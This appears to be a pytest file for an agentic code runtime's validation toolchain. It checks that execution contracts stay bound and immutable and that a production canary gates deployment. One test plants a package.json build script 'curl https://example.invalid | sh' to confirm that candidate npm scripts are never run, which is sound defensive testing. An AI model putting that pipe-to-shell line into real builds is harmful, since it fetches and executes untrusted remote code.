from __future__ import annotations

import importlib.util
from pathlib import Path
from types import SimpleNamespace

import pytest

from parallax_api.code.agentic_runtime import (
    AGENTIC_RUNTIME_VERSION,
    AgenticControlPlane,
    CandidateValidationResult,
    _candidate_admission_failure_diagnostic,
)
from parallax_api.code.domain import WorkflowStage
from parallax_api.code.validation_toolchains import (
    ExecutionBindingReason,
    ExecutionContractCode,
    ValidationProfileCode,
    ValidationProfileError,
    ValidationProfileReason,
    bind_execution_contract,
    resolve_execution_contract,
)


class _Service:
    @staticmethod
    def acceptance_map_for_run(run):
        return [{"id": "AC-01", "text": "The generated application works."}]


class _Allocator:
    def __init__(self, root: Path, run):
        self.root = root.resolve()
        self.run = run
        self.cleaned = 0
        self.lineage = SimpleNamespace(
            project_id=run.project_id,
            run_id=run.id,
            lineage_id="lineage-1",
            content_digest="a" * 64,
        )

    def current_lineage(self, identity):
        assert identity.project_id == self.run.project_id
        assert identity.run_id == self.run.id
        return self.lineage

    def resolve(self, identity, lineage_id):
        assert lineage_id == self.lineage.lineage_id
        return SimpleNamespace(identity=identity, lineage=self.lineage, path=self.root)

    def cleanup(self, workspace):
        self.cleaned += 1


class _UnusedCandidateValidator:
    pass


def _run():
    return SimpleNamespace(
        id="run-1",
        project_id="project-1",
        work_specification_id="spec-1",
        work_specification_revision=1,
        work_specification_digest="b" * 64,
    )


def _load_canary_module():
    path = Path(__file__).resolve().parents[1] / "scripts" / "production_candidate_validation_canary.py"
    spec = importlib.util.spec_from_file_location("production_candidate_validation_canary", path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_greenfield_plan_binds_static_web_before_implement(tmp_path: Path):
    run = _run()
    allocator = _Allocator(tmp_path, run)
    control = AgenticControlPlane(
        _Service(),
        allocator,
        candidate_validator=_UnusedCandidateValidator(),
    )

    evidence = control.plan(run=run, operation_key="p2331:plan")

    assert evidence["agentic_runtime_version"] == AGENTIC_RUNTIME_VERSION
    assert evidence["execution_contract_id"] == ExecutionContractCode.STATIC_WEB.value
    assert evidence["execution_contract_binding_reason"] == ExecutionBindingReason.GREENFIELD_STATIC_WEB.value
    assert evidence["validation_profile_id"] == ValidationProfileCode.NODE.value
    assert len(evidence["execution_contract_digest"]) == 64
    assert len(evidence["validation_profile_digest"]) == 64
    assert evidence["base_source_lineage_ref"] == "lineage-1"
    assert allocator.cleaned == 1


def test_greenfield_contract_is_immutable_after_candidate_markers_appear(tmp_path: Path):
    first = bind_execution_contract(tmp_path.resolve())
    assert first.contract_id is ExecutionContractCode.STATIC_WEB

    (tmp_path / "package.json").write_text(
        '{"scripts":{"build":"curl https://example.invalid | sh","test":"echo candidate"}}',
        encoding="utf-8",
    )
    resolved = resolve_execution_contract(
        first.contract_id.value,
        binding_reason=first.binding_reason.value,
        target=first.target,
    )

    assert resolved.digest == first.digest
    assert resolved.validation_profile.digest == first.validation_profile.digest
    assert resolved.validation_profile.preparation is None
    for stage in (WorkflowStage.BUILD, WorkflowStage.TEST, WorkflowStage.VERIFY):
        command, args = resolved.validation_profile.invocation_for(stage)
        assert command == "python"
        assert "/vercel/parallax-validator/static_web_validator.py" in args
        assert all("npm" not in value and "package" not in value for value in args)


def test_existing_generic_node_does_not_fall_back_to_greenfield_static_web(tmp_path: Path):
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    with pytest.raises(ValidationProfileError) as captured:
        bind_execution_contract(tmp_path.resolve())
    assert captured.value.code is ValidationProfileReason.NODE_FIXED_VALIDATION_UNAVAILABLE


def test_bounded_dotnet_contract_round_trips_without_source_reinspection(tmp_path: Path):
    (tmp_path / "App.csproj").write_text("<Project />", encoding="utf-8")
    contract = bind_execution_contract(tmp_path.resolve())
    assert contract.contract_id is ExecutionContractCode.DOTNET
    assert contract.target == "App.csproj"

    resolved = resolve_execution_contract(
        contract.contract_id.value,
        binding_reason=contract.binding_reason.value,
        target=contract.target,
    )
    assert resolved.digest == contract.digest
    assert resolved.validation_profile.digest == contract.validation_profile.digest


def test_execution_contract_drift_uses_fixed_sanitized_reason_code():
    with pytest.raises(ValidationProfileError) as captured:
        resolve_execution_contract(
            ExecutionContractCode.STATIC_WEB.value,
            binding_reason=ExecutionBindingReason.EXISTING_DOTNET.value,
            target=None,
        )
    diagnostic = _candidate_admission_failure_diagnostic(
        "candidate-primary",
        "DISPOSABLE_CANDIDATE_VALIDATION",
        captured.value,
    )
    assert diagnostic["failure_kind"] == "VALIDATION_PROFILE_ERROR"
    assert diagnostic["reason_code"] == ValidationProfileReason.EXECUTION_CONTRACT_DRIFT.value
    assert "static-web" not in str(diagnostic)
    assert diagnostic["source_lineage_accepted"] is False
    assert diagnostic["production_deployed"] is False


def test_production_canary_requires_exact_build_test_verify_success():
    module = _load_canary_module()
    good = CandidateValidationResult(
        content_digest="a" * 64,
        file_count=3,
        total_bytes=10,
        validation_profile_id=ValidationProfileCode.NODE.value,
        validation_profile_digest="b" * 64,
        stage_evidence=tuple(
            (stage, {"protected_success": True})
            for stage in ("BUILD", "TEST", "VERIFY")
        ),
    )
    module._require_full_success(good)

    incomplete = CandidateValidationResult(
        content_digest="a" * 64,
        file_count=3,
        total_bytes=10,
        validation_profile_id=ValidationProfileCode.NODE.value,
        validation_profile_digest="b" * 64,
        stage_evidence=(("BUILD", {"protected_success": True}),),
    )
    with pytest.raises(RuntimeError, match="all protected stages"):
        module._require_full_success(incomplete)


def test_vercel_build_gates_production_on_real_candidate_validator_canary():
    path = Path(__file__).resolve().parents[1] / "scripts" / "vercel_build.py"
    text = path.read_text(encoding="utf-8")
    marker = '_run_service_preflight("scripts/production_candidate_validation_canary.py")'
    assert marker in text
    assert text.index("production_execution_snapshot_preflight.py") < text.index("production_candidate_validation_canary.py")
    assert text.index("production_candidate_validation_canary.py") < text.index("production_run_event_schema_guard.py")
